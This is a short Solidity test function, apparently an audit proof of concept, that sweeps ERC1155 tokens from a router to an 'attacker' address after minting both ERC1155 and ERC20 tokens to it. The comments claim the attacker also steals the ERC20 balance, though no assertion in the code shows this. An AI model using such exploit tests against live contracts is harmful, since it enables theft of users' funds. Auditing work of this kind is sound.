function testSweepERC1155Attack() public {
 bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.SWEEP_ERC1155)));
 bytes[] memory inputs = new bytes[](1);
 uint256 id = 0;
 inputs[0] = abi.encode(address(erc1155), attacker, id, 0);
 
 erc1155.mint(address(router), id, AMOUNT);
 erc20.mint(address(router), AMOUNT);
 
 router.execute(commands, inputs);
}
//That is, the attacker is being sent an erc1155 token amount, but the router also has an erc20 token amount.
// (In reality, this would probably be due to other transfers, to happen later.)
// The attacker manages to steal the erc20 amount as well.